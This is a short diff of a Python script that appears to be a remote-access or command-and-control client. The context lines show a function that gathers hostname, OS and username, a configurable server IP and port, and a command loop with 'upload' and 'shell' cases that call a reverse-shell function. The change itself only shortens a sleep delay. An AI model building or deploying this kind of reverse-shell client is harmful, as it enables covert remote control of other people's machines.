@@ -12,7 +12,6 @@ def enume():
 
     return {'hostname':hostname, 'OS':OSver, 'username':username}
 
-
 SERVER_HOST = '127.0.0.1'  # Change this to your server's IP
 SERVER_PORT = 5050
 
@@ -94,7 +93,7 @@ while 1:
             upload()
         case 'shell':
             print("line 93")
-            time.sleep(3)
+            time.sleep(1)
             rev_shell(socket=s)
 
 
